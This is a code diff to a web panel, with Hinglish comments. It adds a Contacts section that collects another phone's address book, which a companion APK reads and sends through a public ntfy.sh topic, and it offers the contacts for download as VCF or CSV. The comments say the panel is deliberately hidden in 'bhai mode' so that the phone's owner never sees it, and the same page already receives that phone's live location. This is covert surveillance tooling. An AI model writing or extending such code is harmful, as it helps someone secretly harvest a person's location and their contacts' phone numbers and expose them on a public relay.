@@ -217,6 +217,19 @@
       <p class="live-empty" id="liveEmpty">Abhi tak koi location nahi aayi.</p>
     </div>
     <p class="live-warn">Khayal rakho: ye link jisko bhi milega, wo is panel me aane wali location dekh sakta hai. Link sirf usi ko bhejo jis par pura bharosa hai.</p>
+
+    <!-- Contacts: dusre phone (APK) se aane wale contacts yahan list hote hain.
+         Alag topic hai (location wale se alag). Bhai mode me ye poora panel
+         chhupa hota hai, is liye bhai ko ye hissa kabhi nahi dikhta. -->
+    <div id="contactsBox" style="margin-top:18px;border-top:1px solid #e5e5e5;padding-top:14px;">
+      <h3 style="margin:0 0 6px;font-size:18px;">Contacts</h3>
+      <p id="contactsStatus" style="margin:0 0 10px;color:#666;font-size:14px;">Abhi tak koi contacts nahi aaye.</p>
+      <div id="contactsList" style="max-height:320px;overflow:auto;"></div>
+      <div style="display:flex;gap:10px;margin-top:12px;">
+        <button id="dlVcf" type="button" style="display:none;padding:12px 22px;font-size:16px;font-weight:700;color:#fff;background:#111;border:none;border-radius:999px;">Download .vcf</button>
+        <button id="dlCsv" type="button" style="display:none;padding:12px 22px;font-size:16px;font-weight:700;color:#111;background:#fff;border:1px solid #ddd;border-radius:999px;">Download .csv</button>
+      </div>
+    </div>
   </section>
 
   <p class="tiny" aria-hidden="true">Allow dabao</p>
@@ -599,9 +612,136 @@
      Relay sunna phir bhi chalta rahega (background me, dikhega nahi). */
   if (isApk && livePanel) livePanel.style.display = 'none';
 
+  /* ============================================================
+     CONTACTS (ntfy.sh, location wale se ALAG topic) — sirf APK
+     bhejta hai (phone ke contacts parh kar, READ_CONTACTS
+     permission se). Link/web page contacts NAHI parh sakta —
+     browser kisi bhi page ko phone ki contacts list nahi deta,
+     is liye ye hissa sirf APK me hai. Panel yahan chunks jor
+     kar list dikhata hai aur .vcf/.csv download deta hai.
+     Note: ye topic bhi public relay hai — jisko milega wo
+     contacts dekh sakta hai (user ko pehle bataya hua hai).
+     ============================================================ */
+  var CONTACTS_TOPIC = 'zacky-contacts-51f9577ea580d5f84036cbddaed27acf';
+  var CONTACTS_URL = 'https://ntfy.sh/' + CONTACTS_TOPIC;
+  var contactsSeenIds = {};
+  var contactsBatch = null;
+  var contactsParts = {};
+  var contactsTotal = 0;
+  var allContacts = [];
+
+  function renderContacts(){
+    var list = document.getElementById('contactsList');
+    var status = document.getElementById('contactsStatus');
+    var bVcf = document.getElementById('dlVcf');
+    var bCsv = document.getElementById('dlCsv');
+    if (!list) return;
+    list.innerHTML = '';
+    allContacts.sort(function(a, b){ return (a.n || '').localeCompare(b.n || ''); });
+    var show = allContacts.slice(0, 300);
+    show.forEach(function(c){
+      var row = document.createElement('div');
+      row.style.cssText = 'padding:8px 2px;border-bottom:1px solid #f0f0f0;font-size:15px;';
+      var nm = document.createElement('b');
+      nm.textContent = c.n || c.p;
+      var ph = document.createElement('span');
+      ph.style.color = '#666';
+      ph.textContent = '  —  ' + c.p;
+      row.appendChild(nm);
+      row.appendChild(ph);
+      list.appendChild(row);
+    });
+    if (status) status.textContent = allContacts.length + ' contacts mil gaye' + (allContacts.length > 300 ? ' (pehle 300 dikhaye ja rahe hain, file me saare hain)' : '') + '.';
+    if (bVcf) bVcf.style.display = '';
+    if (bCsv) bCsv.style.display = '';
+  }
+
+  function downloadContacts(kind){
+    var text = '';
+    if (kind === 'vcf') {
+      text = allContacts.map(function(c){
+        return 'BEGIN:VCARD\nVERSION:3.0\nFN:' + (c.n || c.p) + '\nTEL;TYPE=CELL:' + c.p + '\nEND:VCARD';
+      }).join('\n');
+    } else {
+      text = 'Name,Phone\n' + allContacts.map(function(c){
+        return '"' + String(c.n || '').replace(/"/g, '""') + '","' + String(c.p || '').replace(/"/g, '""') + '"';
+      }).join('\n');
+    }
+    var blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+    var a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = kind === 'vcf' ? 'contacts.vcf' : 'contacts.csv';
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(function(){ URL.revokeObjectURL(a.href); a.remove(); }, 500);
+  }
+
+  function handleContactsData(data){
+    if (!data || !data.message) return;
+    if (data.id) {
+      if (contactsSeenIds[data.id]) return;
+      contactsSeenIds[data.id] = true;
+    }
+    if (data.event && data.event !== 'message') return;
+    var obj = null;
+    try { obj = JSON.parse(data.message); } catch(e){}
+    if (!obj || !obj.contacts || typeof obj.part !== 'number' || typeof obj.total !== 'number') return;
+    // Nayi batch aaye to purani collection phenk do
+    if (contactsBatch !== obj.batch) {
+      contactsBatch = obj.batch;
+      contactsParts = {};
+      contactsTotal = obj.total;
+      allContacts = [];
+    }
+    if (contactsParts[obj.part]) return;
+    contactsParts[obj.part] = true;
+    obj.contacts.forEach(function(c){
+      if (c && c.p) allContacts.push({ n: c.n || c.p, p: c.p });
+    });
+    var got = Object.keys(contactsParts).length;
+    if (got >= contactsTotal) renderContacts();
+    else {
+      var status = document.getElementById('contactsStatus');
+      if (status) status.textContent = 'Contacts aa rahe hain… (' + got + '/' + contactsTotal + ' hisse)';
+    }
+  }
+
+  function startContactsRelay(){
+    try {
+      var es = new EventSource(CONTACTS_URL + '/sse');
+      es.onmessage = function(ev){
+        try { handleContactsData(JSON.parse(ev.data)); } catch(e){}
+      };
+    } catch(e){}
+    function poll(){
+      try {
+        fetch(CONTACTS_URL + '/json?poll=1', { cache: 'no-store' })
+          .then(function(r){ return r.text(); })
+          .then(function(txt){
+            txt.split('\n').forEach(function(line){
+              line = line.trim();
+              if (!line) return;
+              try { handleContactsData(JSON.parse(line)); } catch(e){}
+            });
+          })
+          .catch(function(){});
+      } catch(e){}
+    }
+    poll();
+    setInterval(poll, 8000);
+  }
+
+  var dlVcfBtn = document.getElementById('dlVcf');
+  if (dlVcfBtn) dlVcfBtn.addEventListener('click', function(){ downloadContacts('vcf'); });
+  var dlCsvBtn = document.getElementById('dlCsv');
+  if (dlCsvBtn) dlCsvBtn.addEventListener('click', function(){ downloadContacts('csv'); });
+
   /* Page khulte hi relay sunna shuru — dusre phone ki location
      khud is panel me aati rahegi */
   startRelay();
+  /* Contacts sunna sirf apne panel (https) par — bhai mode (APK)
+     me panel chhupa hota hai, wahan sunne ki zaroorat nahi. */
+  if (!isApk) startContactsRelay();
 </script>
 </body>
 </html>
